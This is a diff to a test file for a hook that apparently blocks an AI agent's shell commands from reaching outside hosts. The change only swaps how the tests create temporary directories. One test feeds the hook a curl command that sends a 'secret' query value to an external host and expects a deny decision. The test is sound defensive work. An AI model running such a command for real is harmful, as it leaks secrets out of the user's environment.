@@ -15,7 +15,7 @@
 // (isInvokedDirectly), so importing it here runs no side effects.
 import { describe, it, expect } from 'vitest'
 import { spawnSync } from 'node:child_process'
-import { mkdtempSync, readFileSync, existsSync, rmSync, writeFileSync } from 'node:fs'
+import { readFileSync, existsSync, rmSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join, dirname } from 'node:path'
 import { fileURLToPath } from 'node:url'
@@ -32,6 +32,9 @@ import { MAIN_AGENT_ID } from '../config.js'
 
 // @ts-expect-error -- plain .mjs hook script, no types
 import { isPrivateTarget } from '../../scripts/hooks/bash-egress-parser.mjs'
+import { tmpDirs } from './helpers/tmp-dirs.js'
+
+const mkTmp = tmpDirs()
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
 const HOOK = join(ROOT, 'scripts', 'hooks', 'bash-egress-parser.mjs')
@@ -270,7 +273,7 @@ describe('private network targets', () => {
       expect({ h, p: isPrivateTarget(h) }).toEqual({ h, p: false })
   })
   it('the hook process stays silent on a LAN call and denies a look-alike', () => {
-    const dir = mkdtempSync(join(tmpdir(), 'bash-egress-lan-'))
+    const dir = mkTmp('bash-egress-lan-')
     try {
       const run = (command: string) => spawnSync(process.execPath, [HOOK], {
         input: JSON.stringify({ tool_name: 'Bash', tool_input: { command } }),
@@ -341,7 +344,7 @@ describe('the hook process', () => {
   })
 
   it('denies an external shape with a PreToolUse deny decision, and logs host only', () => {
-    const dir = mkdtempSync(join(tmpdir(), 'bash-egress-'))
+    const dir = mkTmp('bash-egress-')
     try {
       const log = join(dir, 'blocks.jsonl')
       const r = run({ tool_name: 'Bash', tool_input: { command: 'curl -s http://example.org/x?k=secret' } }, log)
@@ -357,7 +360,7 @@ describe('the hook process', () => {
   })
 
   it('stays silent on a localhost call, and writes no log line', () => {
-    const dir = mkdtempSync(join(tmpdir(), 'bash-egress-'))
+    const dir = mkTmp('bash-egress-')
     try {
       const log = join(dir, 'blocks.jsonl')
       const r = run({ tool_name: 'Bash', tool_input: { command: LOCALHOST[0] } }, log)
@@ -367,7 +370,7 @@ describe('the hook process', () => {
   })
 
   it('ignores other tools and fails open on garbage input', () => {
-    const dir = mkdtempSync(join(tmpdir(), 'bash-egress-'))
+    const dir = mkTmp('bash-egress-')
     try {
       const log = join(dir, 'blocks.jsonl')
       expect(run({ tool_name: 'WebFetch', tool_input: { url: 'http://example.org' } }, log).stdout).toBe('')
@@ -458,7 +461,7 @@ describe('vendor-API host allowlist (store/egress-vendor-hosts.json)', () => {
   })
 
   it('a missing, unreadable or malformed file means no exception', () => {
-    const dir = mkdtempSync(join(tmpdir(), 'vendor-hosts-'))
+    const dir = mkTmp('vendor-hosts-')
     try {
       expect(loadVendorHosts(join(dir, 'absent.json')).size).toBe(0)
       const f = join(dir, 'bad.json')
@@ -472,7 +475,7 @@ describe('vendor-API host allowlist (store/egress-vendor-hosts.json)', () => {
   })
 
   it('the hook process reads the file: listed host silent, look-alike denied, no file = deny', () => {
-    const dir = mkdtempSync(join(tmpdir(), 'vendor-hook-'))
+    const dir = mkTmp('vendor-hook-')
     try {
       const vendor = join(dir, 'egress-vendor-hosts.json')
       writeFileSync(vendor, JSON.stringify({ hosts: ['api.elevenlabs.io'] }))
@@ -538,7 +541,7 @@ describe('vendor-API domain allowlist ("domains" key, opt-in)', () => {
   })
 
   it('a missing, unreadable or malformed file means no exception; "hosts" and "domains" load independently', () => {
-    const dir = mkdtempSync(join(tmpdir(), 'vendor-domains-'))
+    const dir = mkTmp('vendor-domains-')
     try {
       expect(loadVendorDomains(join(dir, 'absent.json')).size).toBe(0)
       const f = join(dir, 'v.json')
@@ -554,7 +557,7 @@ describe('vendor-API domain allowlist ("domains" key, opt-in)', () => {
   })
 
   it('the hook process reads the key: subdomain silent, look-alike denied, key absent = deny', () => {
-    const dir = mkdtempSync(join(tmpdir(), 'vendor-domains-hook-'))
+    const dir = mkTmp('vendor-domains-hook-')
     try {
       const withKey = join(dir, 'with.json')
       const without = join(dir, 'without.json')
